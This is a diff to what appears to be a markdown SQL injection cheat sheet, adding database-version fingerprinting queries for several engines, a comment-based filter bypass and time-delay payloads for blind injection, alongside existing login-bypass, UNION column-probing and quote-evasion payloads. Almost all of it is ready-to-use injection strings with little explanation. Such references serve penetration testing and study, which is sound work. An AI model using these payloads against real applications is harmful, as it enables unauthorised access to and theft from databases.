@@ -3,6 +3,19 @@
 # Enter in the username field
 ' OR 1=1--
 ```
+### Retrieving Database Version
+```
+# mysql / mariadb and Microsoft SQL
+select @@version;
+
+# postgreSQL
+select version()
+
+# oracle
+select banner from v$version
+select version from v$instance
+
+```
 
 ### Determine the number of columns in a table
 ```
@@ -72,6 +85,9 @@ SELECT 1,2,3,4 FROM TABLE;    UNION SELECT * from ((SELECT 1 FROM TABLE)a JOIN (
 # mysql
 SELECT/**/1;
 
+# postgreSQL
+/**/
+
 ```
 ### Bypassing Quote Restrictions  
 ```
@@ -81,3 +97,20 @@ SELECT $$TEST$$;
 SELECT $TAG$TEST$TAG$;
 SELECT CHR(84) || CHR(69) || CHR (83)  || CHR (84);
 ```
+# Time Delays
+```
+# mysql / mariadb 
+sleep(10)
+
+# Microsoft SQL 
+WAITFOR DELAY '0:0:10'
+
+# postgreSQL
+SELECT pg_sleep(10)
+
+# oracle
+dbms_pipe.receive_message(('a'),10)
+```
+
+### SQLi Cheat Sheet
+https://portswigger.net/web-security/sql-injection/cheat-sheet
